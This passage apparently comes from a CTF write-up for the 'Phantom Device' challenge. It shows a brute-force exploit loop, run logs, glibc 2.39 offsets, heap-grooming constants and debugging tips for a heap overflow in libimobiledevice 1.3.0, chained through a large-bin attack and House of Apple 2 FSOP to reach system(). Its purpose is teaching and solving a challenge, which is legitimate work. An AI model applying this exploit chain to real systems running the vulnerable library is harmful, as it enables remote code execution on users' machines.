      → FILE2: _write_ptr(1) > _write_base(0) → _IO_OVERFLOW
        → vtable → _IO_wfile_jumps → _IO_wfile_overflow(FILE2)
          → _wide_data._IO_write_base == _IO_buf_base → _IO_wdoallocbuf
            → _wide_vtable.__doallocate(FILE2)
              → system("  cat /flag* >&0")
```

---

## Phase 8 — Putting it all together

### Step 20: The brute force loop

The libc leak is deterministic. The heap leak has 8 bits of uncertainty
(1/256). We loop:

```python
for attempt in range(1, 769):
    sock = connect(host, port)

    # Phase 1: Heap grooming
    handle_readdir_1(sock)     # lay out S, P, guard, C
    handle_readdir_2(sock)     # drain tcache 0x20 bin
    handle_devinfo(sock)       # heap pressure
    handle_fileinfo(sock)      # filler
    handle_readdir_3(sock)     # trigger large bin sort

    # Phase 2: Leaks
    handle_file_open_1(sock)   # send 1-byte → libc leak
    libc_base = read_file_read_1(sock)   # deterministic

    handle_file_open_2(sock)   # send 1-byte → heap leak
    heap_base = read_file_read_2(sock)   # 1/256 guess

    # Phase 3: Attack
    handle_file_open_3(sock)   # deliver FSOP payload
    send_overflow_on_read_3(sock)  # corrupt P's large bin metadata

    # Phase 4: Trigger
    handle_file_close_1(sock)  # → large bin sort → _IO_list_all corrupted
    handle_file_close_2(sock)
    handle_file_close_3(sock)

    # Client returns → exit() → FSOP → system("cat /flag* >&0")
    data = sock.recv(4096)
    if b"CSCTF{" in data:
        print(f"FLAG: {data}")
        break

    sock.close()
```

### Step 21: Run the exploit

**Optimized solver (`solve.py`) — clean, minimal output:**

```
$ python3 solve.py 127.0.0.1 1337
[*] target=127.0.0.1:1337  brute=1/256  max=768
[*] offsets: system=0x58750 main_arena=0x204ac0 io_list_all=0x2054c0 wfile_jumps=0x203228
[*] 1/768  byte0=0xfc
[*] 2/768  byte0=0xce
[*] 3/768  byte0=0xda
[*] 4/768  byte0=0x88
[*] 5/768  byte0=0xc7
[*] 6/768  byte0=0xdf

[+] RCE at attempt #7  byte0=0xc1  time=0.3s
[+] FLAG: CSCTF{test_flag_phantom_device_2026}
```

**Full exploit (`server.py`) — pwntools progress bar, leak details:**

```
$ python3 server.py 127.0.0.1 1337

 ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
 ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
 ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
 ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
 ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
 ██████╗ ███████╗██╗   ██╗██╗ ██████╗███████╗
 ██╔══██╗██╔════╝██║   ██║██║██╔════╝██╔════╝
 ██║  ██║█████╗  ██║   ██║██║██║     █████╗
 ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║     ██╔══╝
 ██████╔╝███████╗ ╚████╔╝ ██║╚██████╗███████╗
 ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝ ╚═════╝╚══════╝

[*] ============================================================
[*]   CVE-2026-116258 + CVE-2026-116261
[*]   libimobiledevice 1.3.0 → glibc 2.39 RCE
[*]   Large Bin Attack → House of Apple 2 FSOP
[*] ============================================================
[+] Resolved offsets from ../../../docker/libs/libc.so.6
[*]   system          = 0x58750
[*]   main_arena      = 0x204ac0 (fallback)
[*]   _IO_list_all    = 0x2054c0
[*]   _IO_wfile_jumps = 0x203228
[*] Target  : 127.0.0.1:1337
[*] Command : cat /flag* >&0
[*] Brute   : up to 768 attempts (1/256 heap byte0)

[x] Brute-forcing heap byte0: █░░░░░░░░░░░░░░░░░░░  1/768  byte0=0xdd  libc=✓ heap=✓  TRIG
[x] Brute-forcing heap byte0: █░░░░░░░░░░░░░░░░░░░  2/768  byte0=0xe4  libc=✓ heap=✓  TRIG
    ...
[x] Brute-forcing heap byte0: █░░░░░░░░░░░░░░░░░░░ 56/768  byte0=0x07  libc=✓ heap=✓  TRIG
[+] Brute-forcing heap byte0: ☠  RCE achieved at attempt #57  (byte0=0xdc)

[*] ───────────────────────────────────────────────
[*]   LIBC LEAK
[*]     libc_base      = 0x7fc2dbc28000
[*]     system()       = 0x7fc2dbc80750
[*]     _IO_list_all   = 0x7fc2dbe2d4c0
[*]     _IO_wfile_jumps= 0x7fc2dbe2b228
[*]   HEAP LEAK
[*]     chunk_page     = 0x649d40fdc000
[*]     v_chunk        = 0x649d40fdd5b0
[*]     byte0 guess    = 0xdc ✓
[*] ───────────────────────────────────────────────

[+]   FLAG: CSCTF{test_flag_phantom_device_2026}
```

Average: ~128 attempts, ~30 seconds. Worst case: ~80 seconds.
The two runs above hit at attempt 7 (0.3s) and attempt 57 — luck of the
1/256 draw.

---

## Quick reference

### Libc offsets (glibc 2.39, Ubuntu 24.04)

```
main_arena      = 0x204ac0  (LOCAL symbol — not in .dynsym)
system          = 0x058750
_IO_list_all    = 0x2054c0
_IO_wfile_jumps = 0x203228
```

### Heap grooming constants

```
S chunk:   72-byte string  → 0x60 chunk  (overflow source)
P chunk:   0x418-byte str  → 0x430 chunk (large bin victim)
guard:     ".."             → 0x20 chunk  (consolidation barrier)
C chunk:   0x408-byte str  → 0x420 chunk (freed into large bin)
V chunk:   0x410-byte body → 0x420 chunk (FSOP payload carrier)
Overflow:  alloc=0x50, send=0x80 (0x30 bytes overflow into P)
V_OFFSET:  0x15b0 (V's address relative to heap base)
```

### Key GDB breakpoints for debugging

```
break afc_receive_data        — trace every AFC response processing
break *afc_file_open+0x85     — catch the memcpy that leaks heap data
break malloc if size==0x410   — catch chunk V allocation
break _IO_flush_all_lockp     — FSOP entry point
break system                  — confirm RCE
```

---

## Architecture

The challenge runs behind `socat` on port 1337. Each connection forks a
fresh `client` process whose stdin is the player's TCP socket. The client
redirects stdout/stderr to `/dev/null` and speaks AFC over fd 0. No
outbound connectivity — everything happens over the single inbound
connection. The flag is injected at runtime via the `FLAG` env var.

Player-side: connect to port 1337, implement a malicious AFC server,
and read the flag from the same socket after RCE fires (via `>&0`).

## Local Docker testing

```bash
cd docker/
docker compose up -d --build

container=$(docker ps -qf "ancestor=docker-phantom-device")
docker cp $container:/usr/lib/x86_64-linux-gnu/libimobiledevice-1.0.so.6 .
docker cp $container:/lib/x86_64-linux-gnu/libc.so.6 .
docker cp $container:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 .

cd ../dev/src/exploit/
python3 solve.py localhost 1337
```

### Debug build for GDB tracing

```bash
# Build a debug container with GDB:
docker build -f Dockerfile.debug -t phantom-debug .
docker run --rm -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
    -p 1337:1337 phantom-debug

# Inside the container:
gdb -q /challenge/client
(gdb) set environment LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu
(gdb) break main
(gdb) run
```

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| Client disconnects immediately | Bad AFC magic or packet_num mismatch | Hex-dump your packets; magic must be `CFA6LPAA`, packet_num must echo the request |
| Libc leak returns 0 or garbage | tcache 0x20 bin not drained | Send more short strings in readdir #2; verify with `(gdb) p tcache->counts[0]` |
| Heap leak always wrong | Safe-linking XOR not handled | Remember: `stored_fd = real_fd ^ (chunk >> 12)` — you're reading the XOR'd value |
| FSOP never fires | `_IO_list_all` not corrupted | Check `(gdb) x/gx &_IO_list_all` after file_close #1 — should point to heap |
| system() called but no flag | stdout is /dev/null | Command must use `>&0` to write to fd 0 (the socket), not stdout |
| Crashes inside _IO_flush_all_lockp | Bad FILE struct fields | Check `_lock` points to 8 zero bytes; `_vtable` is `_IO_wfile_jumps` exactly |
| `main_arena` offset wrong | Tried pwntools `.symbols` | It's LOCAL — use `readelf -s --wide libc.so.6 \| grep main_arena` |
| All 768 attempts fail | V_OFFSET shifted | Attach GDB, set `break malloc if size==0x410`, check `heap_base + 0x15b0 == V` |
